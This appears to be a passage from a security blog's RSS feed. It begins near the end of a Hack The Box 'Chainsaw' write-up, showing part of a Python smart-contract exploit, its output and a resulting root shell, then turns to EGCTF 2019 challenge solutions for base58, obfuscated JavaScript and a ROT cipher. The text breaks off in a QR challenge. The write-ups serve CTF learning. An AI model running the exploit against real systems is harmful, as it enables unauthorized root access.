class="number">1000</span>).transact()</span><br><span class="line">print(GREEN + <span class="string">"[*] Done. getBalance(): "</span> + str(contract.functions.getBalance().call()))</span><br><span class="line">print(GREEN + <span class="string">"[+] Exploit finished. Now you can login with the provided credentials: &#123;&#125;:&#123;&#125;, Exiting..."</span>.format(username,password))</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) != <span class="number">4</span>:</span><br><span class="line">print(YELLOW + <span class="string">"[!] Usage: &#123;&#125; [contract address] [username] [password]"</span>.format(argv[<span class="number">0</span>]))</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">address = argv[<span class="number">1</span>]</span><br><span class="line">username = argv[<span class="number">2</span>]</span><br><span class="line">password = argv[<span class="number">3</span>]</span><br><span class="line">passhash = md5(password.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">exploit(address, username, password, passhash)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw# .&#x2F;ChainsawClubExploit.py 0xE6384BBbBb7C30C4Af2287872179296d46d863bE rick pwn3d                                                                                            </span><br><span class="line">[+] Starting</span><br><span class="line">[+] Connecting to localhost:63991</span><br><span class="line">[*] Connection Established</span><br><span class="line">[+] Creating the contract representation</span><br><span class="line">[+] Address: 0xE6384BBbBb7C30C4Af2287872179296d46d863bE</span><br><span class="line">[*] Done</span><br><span class="line">[+] Calling setUsername() with: rick</span><br><span class="line">[*] Done. getUsername(): rick</span><br><span class="line">[+] Calling setPassword() with: b2f3d1e0efcb5d60e259a34ecbbdbe00 (pwn3d)</span><br><span class="line">[*] Done. getPassword(): b2f3d1e0efcb5d60e259a34ecbbdbe00</span><br><span class="line">[+] Calling setApprove() with: True</span><br><span class="line">[*] Done. getApprove(): True</span><br><span class="line">[+] Calling transfer() with: 1000</span><br><span class="line">[*] Done. getBalance(): 1000</span><br><span class="line">[+] Exploit finished. Now you can login with the provided credentials: rick:pwn3d, Exiting...</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;chainsaw#</span><br></pre></td></tr></table></figure><p>After authenticating I got a root shell:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">bobby@chainsaw:~&#x2F;projects&#x2F;ChainsawClub$ .&#x2F;ChainsawClub </span><br><span class="line"></span><br><span class="line">      _           _</span><br><span class="line">     | |         (_)</span><br><span class="line">  ___| |__   __ _ _ _ __  ___  __ ___      __</span><br><span class="line"> &#x2F; __| &#39;_ \ &#x2F; _&#96; | | &#39;_ \&#x2F; __|&#x2F; _&#96; \ \ &#x2F;\ &#x2F; &#x2F;</span><br><span class="line">| (__| | | | (_| | | | | \__ \ (_| |\ V  V &#x2F;</span><br><span class="line"> \___|_| |_|\__,_|_|_| |_|___&#x2F;\__,_| \_&#x2F;\_&#x2F;</span><br><span class="line">                                            club</span><br><span class="line"></span><br><span class="line">- Total supply: 1000</span><br><span class="line">- 1 CHC &#x3D; 51.08 EUR</span><br><span class="line">- Market cap: 51080 (€)</span><br><span class="line"></span><br><span class="line">[*] Please sign up first and then log in!</span><br><span class="line">[*] Entry based on merit.</span><br><span class="line"></span><br><span class="line">Username: rick</span><br><span class="line">Password: </span><br><span class="line"></span><br><span class="line">         ************************</span><br><span class="line">         * Welcome to the club! *</span><br><span class="line">         ************************</span><br><span class="line"></span><br><span class="line"> Rule #1: Do not get excited too fast.</span><br><span class="line">    </span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub# </span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub# whoami</span><br><span class="line">root</span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@chainsaw:&#x2F;home&#x2F;bobby&#x2F;projects&#x2F;ChainsawClub#</span><br></pre></td></tr></table></figure><p>However the root flag wasn’t there:<br><img src="/images/hackthebox/chainsaw/4.png" alt=""></p><h2 id="Slack-Space-–-gt-Root-Flag"><a href="#Slack-Space-–-gt-Root-Flag" class="headerlink" title="Slack Space –&gt; Root Flag"></a>Slack Space –&gt; Root Flag</h2><p><code>root.txt</code> size is 52 bytes, the block size here is 4096 bytes which means that there are 4044 unused bytes (<code>4096 - 52</code>)  which is called “slack space”. (Check <a href="https://whatis.techtarget.com/definition/slack-space-file-slack-space" target="_blank" rel="noopener">this page</a>, and <a href="https://techcyberz.wordpress.com/2014/01/30/hiding-data-slack-space-on-linux/" target="_blank" rel="noopener">this one</a>).<br>Slack space can be used to hide data, which was the case here with the root flag. I used <code>bmap</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bmap --mode slack root.txt --verbose</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/chainsaw/5.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/networked/">Hack The Box - Networked</a><br>Next Hack The Box write-up : <a href="/hack-the-box/heist/">Hack The Box - Heist</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/chainsaw/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EGCTF 2019 - Qualification Round</title>
      <link>https://0xrick.github.io/ctfs/egctf-qual/</link>
      <guid>https://0xrick.github.io/ctfs/egctf-qual/</guid>
      <pubDate>Sun, 17 Nov 2019 03:00:00 GMT</pubDate>
      <description>
      
        Write-ups for some of the challenges from EGCTF 2019 Qualification Round.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="EGCTF-2019-Qualification-Round"><a href="#EGCTF-2019-Qualification-Round" class="headerlink" title="EGCTF 2019 - Qualification Round"></a>EGCTF 2019 - Qualification Round</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>I participated in <a href="https://ctf2019.egcert.eg/" target="_blank" rel="noopener">EG-CTF 2019</a> qualification round which was held in Friday November 15 2019 and lasted for 26 hours, These are my quick write-ups for some of the challenges.</p><ul><li><a href="#starter-decode-me-">Starter: Decode me :)</a></li><li><a href="#starter-js-cryptominer">Starter: JS CryptoMiner</a></li><li><a href="#starter-rotten-code">Starter: Rotten Code</a></li><li><a href="#misc-qr-c0d3">Misc: QR c0d3</a></li><li><a href="#web-hold-up">Web: Hold Up</a></li><li><a href="#web-tamp3rat0r">Web: Tamp3rat0r</a></li><li><a href="#crypto-des-amies">Crypto: Des amies</a></li><li><a href="#forensics-data-leakage">Forensics: Data Leakage</a></li><li><a href="#forensics-oh-my-salary">Forensics: Oh My Salary!</a></li><li><a href="#forensics-secret-agent">Forensics: Secret Agent</a></li></ul><p><img src="/images/ctfs/egctf-qual/0.png" alt=""></p><h2 id="Starter-Decode-me"><a href="#Starter-Decode-me" class="headerlink" title="Starter: Decode me :)"></a>Starter: Decode me :)</h2><h3 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Here you are</span><br><span class="line"></span><br><span class="line">The message is 7uvxEhXkGkmPhYQtDE3Eg99ZKfr8kRwFe15nNkg9eyFLKXqe Good luck!!</span><br><span class="line"></span><br><span class="line">Flag Format EGCTF&#123;50m3_l337_73x7&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h3><p>This was a very easy one, we’re given an encoded string and we need to decode it to retrieve the flag, I tried some of the known encoding methods and found that it was <code>base-58</code> encoded:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;starter&#x2F;decode-me# base58 -d .&#x2F;message.txt </span><br><span class="line">EGCTF&#123;574r73r_ch4ll3n635_4r3_6r337&#125;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;starter&#x2F;decode-me#</span><br></pre></td></tr></table></figure><h2 id="Starter-JS-CryptoMiner"><a href="#Starter-JS-CryptoMiner" class="headerlink" title="Starter: JS CryptoMiner"></a>Starter: JS CryptoMiner</h2><h3 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We found <span class="keyword">this</span> obfuscated JS code and we think it may be a cryptominer. Please confirm and extract the hidden flag.</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a=[<span class="string">'\x57\x44\x4a\x73\x65\x6c\x67\x77\x57\x6a\x46\x69\x62\x6a\x41\x39'</span>,<span class="string">'\x5a\x6e\x4a\x76\x62\x55\x4e\x6f\x59\x58\x4a\x44\x62\x32\x52\x6c'</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;<span class="keyword">while</span>(--f)&#123;c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());&#125;&#125;;e(++d);&#125;(a,<span class="number">0xc7</span>));<span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;c=c<span class="number">-0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">if</span>(b[<span class="string">'mPLuJI'</span>]===<span class="literal">undefined</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> f=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> g;<span class="keyword">try</span>&#123;g=<span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span>+<span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span>+<span class="string">');'</span>)();&#125;<span class="keyword">catch</span>(h)&#123;g=<span class="built_in">window</span>;&#125;<span class="keyword">return</span> g;&#125;;<span class="keyword">var</span> i=f();<span class="keyword">var</span> j=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;i[<span class="string">'atob'</span>]||(i[<span class="string">'atob'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">k</span>)</span>&#123;<span class="keyword">var</span> l=<span class="built_in">String</span>(k)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>,<span class="string">''</span>);<span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0x0</span>,n,o,p=<span class="number">0x0</span>,q=<span class="string">''</span>;o=l[<span class="string">'charAt'</span>](p++);~o&amp;&amp;(n=m%<span class="number">0x4</span>?n*<span class="number">0x40</span>+o:o,m++%<span class="number">0x4</span>)?q+=<span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span>&amp;n&gt;&gt;(<span class="number">-0x2</span>*m&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;o=j[<span class="string">'indexOf'</span>](o);&#125;<span class="keyword">return</span> q;&#125;);&#125;());b[<span class="string">'QMZCsz'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">r</span>)</span>&#123;<span class="keyword">var</span> s=atob(r);<span class="keyword">var</span> t=[];<span class="keyword">for</span>(<span class="keyword">var</span> u=<span class="number">0x0</span>,v=s[<span class="string">'length'</span>];u&lt;v;u++)&#123;t+=<span class="string">'%'</span>+(<span class="string">'00'</span>+s[<span class="string">'charCodeAt'</span>](u)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(t);&#125;;b[<span class="string">'MdcAcN'</span>]=&#123;&#125;;b[<span class="string">'mPLuJI'</span>]=!![];&#125;<span class="keyword">var</span> w=b[<span class="string">'MdcAcN'</span>][c];<span class="keyword">if</span>(w===<span class="literal">undefined</span>)&#123;e=b[<span class="string">'QMZCsz'</span>](e);b[<span class="string">'MdcAcN'</span>][c]=e;&#125;<span class="keyword">else</span>&#123;e=w;&#125;<span class="keyword">return</span> e;&#125;;variable=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;flag=<span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x46</span>,<span class="number">0x7b</span>,<span class="number">0x4a</span>,<span class="number">0x61</span>,<span class="number">0x76</span>,<span class="number">0x61</span>,<span class="number">0x53</span>,<span class="number">0x63</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x74</span>)+atob(b(<span class="string">'0x1'</span>));&#125;;another=!![];</span><br></pre></td></tr></table></figure><h3 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h3><p>I used <a href="https://beautifier.io/" target="_blank" rel="noopener">beautifier.io</a> to beautify the <code>javascript</code> code:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">'\x57\x44\x4a\x73\x65\x6c\x67\x77\x57\x6a\x46\x69\x62\x6a\x41\x39'</span>, <span class="string">'\x5a\x6e\x4a\x76\x62\x55\x4e\x6f\x59\x58\x4a\x44\x62\x32\x52\x6c'</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--f) &#123;</span><br><span class="line">            c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, <span class="number">0xc7</span>));</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">'mPLuJI'</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> g;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    g = <span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span> + <span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span> + <span class="string">');'</span>)();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (h) &#123;</span><br><span class="line">                    g = <span class="built_in">window</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> g;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">var</span> i = f();</span><br><span class="line">            <span class="keyword">var</span> j = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;</span><br><span class="line">            i[<span class="string">'atob'</span>] || (i[<span class="string">'atob'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">k</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> l = <span class="built_in">String</span>(k)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>, <span class="string">''</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> m = <span class="number">0x0</span>, n, o, p = <span class="number">0x0</span>, q = <span class="string">''</span>; o = l[<span class="string">'charAt'</span>](p++); ~o &amp;&amp; (n = m % <span class="number">0x4</span> ? n * <span class="number">0x40</span> + o : o, m++ % <span class="number">0x4</span>) ? q += <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span> &amp; n &gt;&gt; (<span class="number">-0x2</span> * m &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">                    o = j[<span class="string">'indexOf'</span>](o);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> q;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        b[<span class="string">'QMZCsz'</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> s = atob(r);</span><br><span class="line">            <span class="keyword">var</span> t = [];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> u = <span class="number">0x0</span>, v = s[<span class="string">'length'</span>]; u &lt; v; u++) &#123;</span><br><span class="line">                t += <span class="string">'%'</span> + (<span class="string">'00'</span> + s[<span class="string">'charCodeAt'</span>](u)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(t);</span><br><span class="line">        &#125;;</span><br><span class="line">        b[<span class="string">'MdcAcN'</span>] = &#123;&#125;;</span><br><span class="line">        b[<span class="string">'mPLuJI'</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> w = b[<span class="string">'MdcAcN'</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (w === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        e = b[<span class="string">'QMZCsz'</span>](e);</span><br><span class="line">        b[<span class="string">'MdcAcN'</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        e = w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;;</span><br><span class="line">variable = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    flag = <span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>, <span class="number">0x4a</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x61</span>, <span class="number">0x53</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x70</span>, <span class="number">0x74</span>) + atob(b(<span class="string">'0x1'</span>));</span><br><span class="line">&#125;;</span><br><span class="line">another = !![];</span><br></pre></td></tr></table></figure><p>By looking at the end of the code we’ll see this function:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">variable = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    flag = <span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>, <span class="number">0x47</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7b</span>, <span class="number">0x4a</span>, <span class="number">0x61</span>, <span class="number">0x76</span>, <span class="number">0x61</span>, <span class="number">0x53</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x70</span>, <span class="number">0x74</span>) + atob(b(<span class="string">'0x1'</span>));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>So what I did was to paste the code in the <code>js</code> console, call the function and read the flag:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/EGCTF-Quals/starter/JSCryptoMiner# js</span><br><span class="line">&gt; <span class="keyword">var</span> a=[<span class="string">'\x57\x44\x4a\x73\x65\x6c\x67\x77\x57\x6a\x46\x69\x62\x6a\x41\x39'</span>,<span class="string">'\x5a\x6e\x4a\x76\x62\x55\x4e\x6f\x59\x58\x4a\x44\x62\x32\x52\x6c'</span>];(<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;<span class="keyword">var</span> e=<span class="function"><span class="keyword">function</span>(<span class="params">f</span>)</span>&#123;<span class="keyword">while</span>(--f)&#123;c[<span class="string">'push'</span>](c[<span class="string">'shift'</span>]());&#125;&#125;;e(++d);&#125;(a,<span class="number">0xc7</span>));<span class="keyword">var</span> b=<span class="function"><span class="keyword">function</span>(<span class="params">c,d</span>)</span>&#123;c=c<span class="number">-0x0</span>;<span class="keyword">var</span> e=a[c];<span class="keyword">if</span>(b[<span class="string">'mPLuJI'</span>]===<span class="literal">undefined</span>)&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> f=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> g;<span class="keyword">try</span>&#123;g=<span class="built_in">Function</span>(<span class="string">'return\x20(function()\x20'</span>+<span class="string">'&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)'</span>+<span class="string">');'</span>)();&#125;<span class="keyword">catch</span>(h)&#123;g=<span class="built_in">window</span>;&#125;<span class="keyword">return</span> g;&#125;;<span class="keyword">var</span> i=f();<span class="keyword">var</span> j=<span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span>;i[<span class="string">'atob'</span>]||(i[<span class="string">'atob'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">k</span>)</span>&#123;<span class="keyword">var</span> l=<span class="built_in">String</span>(k)[<span class="string">'replace'</span>](<span class="regexp">/=+$/</span>,<span class="string">''</span>);<span class="keyword">for</span>(<span class="keyword">var</span> m=<span class="number">0x0</span>,n,o,p=<span class="number">0x0</span>,q=<span class="string">''</span>;o=l[<span class="string">'charAt'</span>](p++);~o&amp;&amp;(n=m%<span class="number">0x4</span>?n*<span class="number">0x40</span>+o:o,m++%<span class="number">0x4</span>)?q+=<span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](<span class="number">0xff</span>&amp;n&gt;&gt;(<span class="number">-0x2</span>*m&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;o=j[<span class="string">'indexOf'</span>](o);&#125;<span class="keyword">return</span> q;&#125;);&#125;());b[<span class="string">'QMZCsz'</span>]=<span class="function"><span class="keyword">function</span>(<span class="params">r</span>)</span>&#123;<span class="keyword">var</span> s=atob(r);<span class="keyword">var</span> t=[];<span class="keyword">for</span>(<span class="keyword">var</span> u=<span class="number">0x0</span>,v=s[<span class="string">'length'</span>];u&lt;v;u++)&#123;t+=<span class="string">'%'</span>+(<span class="string">'00'</span>+s[<span class="string">'charCodeAt'</span>](u)[<span class="string">'toString'</span>](<span class="number">0x10</span>))[<span class="string">'slice'</span>](<span class="number">-0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(t);&#125;;b[<span class="string">'MdcAcN'</span>]=&#123;&#125;;b[<span class="string">'mPLuJI'</span>]=!![];&#125;<span class="keyword">var</span> w=b[<span class="string">'MdcAcN'</span>][c];<span class="keyword">if</span>(w===<span class="literal">undefined</span>)&#123;e=b[<span class="string">'QMZCsz'</span></span><br><span class="line">](e);b[<span class="string">'MdcAcN'</span>][c]=e;&#125;<span class="keyword">else</span>&#123;e=w;&#125;<span class="keyword">return</span> e;&#125;;variable=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;flag=<span class="built_in">String</span>[b(<span class="string">'0x0'</span>)](<span class="number">0x45</span>,<span class="number">0x47</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x46</span>,<span class="number">0x7b</span>,<span class="number">0x4a</span>,<span class="number">0x61</span>,<span class="number">0x76</span>,<span class="number">0x61</span>,<span class="number">0x53</span>,<span class="number">0x63</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x70</span>,<span class="number">0x74</span>)+atob(b(<span class="string">'0x1'</span>));&#125;;another=!![];</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt; variable()</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; flag</span><br><span class="line"><span class="string">'EGCTF&#123;JavaScript_is_Fun&#125;'</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h2 id="Starter-Rotten-Code"><a href="#Starter-Rotten-Code" class="headerlink" title="Starter: Rotten Code"></a>Starter: Rotten Code</h2><h3 id="Challenge-Description-2"><a href="#Challenge-Description-2" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We found this key online but it does not make any sense to us. Can you figure anything out?</span><br><span class="line"></span><br><span class="line">CEARD&#123;Pmr14_jm0m0m0m0m0m0m0m0m0m0mn&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h3><p>By looking at the text it’s easily recognizable that this is the flag but the letters are substituted.<br>We know that the flag starts with <code>EGCTF</code> so <code>C</code> is <code>E</code> and <code>E</code> is <code>G</code>, which means that the offset is 2. I used <a href="https://rot13.com/" target="_blank" rel="noopener">rot13.com</a> to decode the flag:<br><img src="/images/ctfs/egctf-qual/1.png" alt=""></p><h2 id="Misc-QR-c0d3"><a href="#Misc-QR-c0d3" class="headerlink" title="Misc: QR c0d3"></a>Misc: QR c0d3</h2><h3 id="Challenge-Description-3"><a href="#Challenge-Description-3" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I tried so hard and got so far but in the end I have nothing to try. Can you help me read this QR code</span><br><span class="line"></span><br><span class="line">Flag format EGCTF&#123;$0m3_l337_73x7&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h3><p>We’re given an image called <code>QR.png</code>:<br><img src="/images/ctfs/egctf-qual/10QR.png" alt=""><br>I used <a href="https://www.onlinebarcodereader.com/" target="_blank" rel="noopener">onlinebarcodereader.com</a> to read the qr code, but I only got a small part of the 